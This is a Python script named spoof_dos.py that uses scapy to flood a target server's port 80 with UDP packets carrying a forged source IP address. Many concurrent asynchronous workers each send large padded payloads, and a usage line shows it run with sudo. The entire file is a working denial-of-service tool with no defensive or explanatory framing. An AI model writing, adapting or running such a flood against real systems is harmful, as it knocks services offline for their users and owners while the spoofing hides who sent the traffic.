import threading
import os
import time
import asyncio
from scapy.all import *




#USAGE sudo python3 spoof_dos.py 



async def send_packets(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count, iface):
    try:
        conf.L3socket = L3RawSocket
        packets = IP(src=spoofed_ip, dst=target_ip) / UDP(sport=spoofed_port, dport=target_port) / payload
        send_interval = 0.001 
        start_time = time.time()
        for _ in range(packet_count):
            send(packets, iface=iface, verbose=False)
            await asyncio.sleep(send_interval)
    except Exception as e:
        print("Error sending packets:", e)

async def flood_worker(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count, iface):
    tasks = []
    for _ in range(packet_count):
        tasks.append(send_packets(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count, iface))
    await asyncio.gather(*tasks)

def main():
    try:
        if len(sys.argv) != 4:
            print("Usage: python3 spoof_dos.py <server_IP> <interface> <spoofed_ip>")
            return

        target_ip = sys.argv[1]
        iface = sys.argv[2]
        spoofed_ip = sys.argv[3]



        target_port = 80
        spoofed_port = 420
        payload = b"A" * 1400  
        packet_count = 1000

        num_threads = os.cpu_count() * 10
        loop = asyncio.get_event_loop()
        tasks = [flood_worker(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count, iface) for _ in range(num_threads)]
        loop.run_until_complete(asyncio.gather(*tasks))
        loop.close()

    except KeyboardInterrupt:
        print("Keyboard interrupt detected. Stopping...")
    except Exception as e:
        print("An error occurred:", e)

if __name__ == "__main__":
    main()

